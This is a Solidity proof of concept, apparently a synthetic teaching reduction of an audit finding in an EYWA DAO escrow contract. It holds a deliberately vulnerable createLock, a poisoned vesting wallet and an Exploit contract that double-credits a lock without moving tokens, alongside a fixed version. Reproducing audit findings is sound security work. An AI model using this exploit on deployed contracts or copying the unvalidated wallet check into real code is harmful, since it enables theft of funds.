// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EYWA DAO — EscrowManager.createLock missing vesting-wallet validation
    (MixBytes, finding #44331)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: createLock checks only beneficiary(), never that the wallet
    was issued by the vesting factory. A poisoned wallet whose transfer()
    moves nothing is still credited, and the same wallet can be passed twice.
    Vulnerable line preserved verbatim below (@> VULN). */

interface IVestingWallet {
    function beneficiary() external view returns (address);
    function transfer(address to) external;
}

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// Attacker wallet: beneficiary() is the attacker, transfer() moves nothing.
contract PoisonedVestingWallet is IVestingWallet {
    address public beneficiary;
    MockToken public eywa;
    uint256 public noopCount;

    constructor(address beneficiary_, MockToken eywa_) {
        beneficiary = beneficiary_;
        eywa = eywa_;
    }

    function transfer(address) external {
        noopCount += 1;
    }
}

/// Honest wallet used only by the control test. transfer() actually sends EYWA.
contract HonestVestingWallet is IVestingWallet {
    address public beneficiary;
    MockToken public eywa;

    constructor(address beneficiary_, MockToken eywa_) {
        beneficiary = beneficiary_;
        eywa = eywa_;
    }

    function transfer(address to) external {
        uint256 bal = eywa.balanceOf(address(this));
        if (bal != 0) eywa.transfer(to, bal);
    }
}

contract EscrowManager {
    MockToken public EYWA;
    uint256 public nextId;
    uint256 public lastLock;
    mapping(uint256 => uint256) public pureLock;
    mapping(uint256 => address) public ownerOf;
    mapping(address => bool) public factoryValid;

    error InvalidArrayLength();
    error InvalidBeneficiary();
    error InvalidLockDuration();
    error InvalidLockAmount();
    error InvalidVestingWallet();

    constructor(MockToken eywa_) {
        EYWA = eywa_;
    }

    function createLock(uint256 lockDuration_, address recipient_, address[] calldata vestingWallets_) external {
        if (vestingWallets_.length == 0) {
            revert InvalidArrayLength();
        }
        uint256 m_lockAmount;
        IVestingWallet m_vestingWallet;
        for (uint256 i = 0; i < vestingWallets_.length; ++i) {
            m_vestingWallet = IVestingWallet(vestingWallets_[i]);
            // Only beneficiary is checked, but not the wallet address itself
            if (m_vestingWallet.beneficiary() != msg.sender) {
                revert InvalidBeneficiary();
            }
            // @> VULN: no factory/whitelist check; balance is credited even when transfer() moves nothing
            m_lockAmount += EYWA.balanceOf(address(m_vestingWallet));
            // FIX: if (!factoryValid[address(m_vestingWallet)]) revert InvalidVestingWallet();
            m_vestingWallet.transfer(address(this));
        }
        _recordLock(m_lockAmount, lockDuration_, recipient_);
    }

    /// Recommended fix: reject any wallet the factory did not issue, then credit.
    function createLockFixed(uint256 lockDuration_, address recipient_, address[] calldata vestingWallets_) external {
        if (vestingWallets_.length == 0) {
            revert InvalidArrayLength();
        }
        uint256 m_lockAmount;
        IVestingWallet m_vestingWallet;
        for (uint256 i = 0; i < vestingWallets_.length; ++i) {
            m_vestingWallet = IVestingWallet(vestingWallets_[i]);
            if (m_vestingWallet.beneficiary() != msg.sender) {
                revert InvalidBeneficiary();
            }
            if (!factoryValid[address(m_vestingWallet)]) {
                revert InvalidVestingWallet();
            }
            m_lockAmount += EYWA.balanceOf(address(m_vestingWallet));
            m_vestingWallet.transfer(address(this));
        }
        _recordLock(m_lockAmount, lockDuration_, recipient_);
    }

    function setFactoryValid(address wallet, bool ok) external {
        factoryValid[wallet] = ok;
    }

    function _recordLock(uint256 lockAmount_, uint256 lockDuration_, address recipient_) internal {
        if (lockDuration_ == 0) revert InvalidLockDuration();
        if (lockAmount_ == 0) revert InvalidLockAmount();
        uint256 id = nextId + 1;
        nextId = id;
        ownerOf[id] = recipient_;
        pureLock[id] = lockAmount_;
        lastLock = lockAmount_;
    }
}

contract Exploit {
    MockToken public eywa; // CREATE nonce 1
    EscrowManager public escrow; // CREATE nonce 2
    PoisonedVestingWallet public poison; // CREATE nonce 3

    constructor() {
        eywa = new MockToken("EYWA", "EYWA", 18);
        escrow = new EscrowManager(eywa);
        poison = new PoisonedVestingWallet(address(this), eywa);
    }

    function run() external {
        uint256 amount = 1000 ether;
        eywa.mint(address(poison), amount);
        address[] memory wallets = new address[](2);
        wallets[0] = address(poison);
        wallets[1] = address(poison);
        escrow.createLock(1, address(this), wallets);
        uint256 kept = eywa.balanceOf(address(poison));
        uint256 pulled = eywa.balanceOf(address(escrow));
        uint256 credited = escrow.lastLock();
        require(kept == amount, "attacker wallet did not keep EYWA");
        require(pulled == 0, "escrow received tokens");
        require(credited == amount * 2, "lock was not double-credited");
        require(poison.noopCount() == 2, "transfer was not a no-op twice");
    }
}
